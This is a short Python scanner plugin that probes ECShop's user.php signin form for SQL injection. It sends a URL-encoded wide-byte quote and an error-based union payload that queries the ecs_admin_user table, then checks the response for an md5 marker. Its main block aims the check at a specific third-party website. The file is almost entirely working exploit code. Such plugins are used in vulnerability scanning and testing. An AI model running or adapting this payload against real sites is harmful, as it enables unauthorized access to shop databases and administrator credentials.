#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'xfkxfk'

def assign(service, arg):
    if service == "ecshop":
        return True, arg

def audit(arg):
    url = arg
    url = url + '/user.php?act=signin'
    post_data = 'username=%CE%27%20and%201=1%20union%20select%201%20and%20%28select%201%20from%28select%20count%28%2a%29%2Cconcat%28%28Select%20concat%280x5b%2Cmd5%283.1415%29%2C0x5d%29%20FROM%20ecs_admin_user%20limit%200%2C1%29%2Cfloor%28rand%280%29%2a2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%20%23 '
    code, head, body, _, _ = curl.curl('-d ' + post_data + url)
    if code == 200:
        if body and body.find('63e1f04640e83605c1d177544a5a0488') != -1:
            security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('ecshop', 'http://www.out521.com/shop')[1])
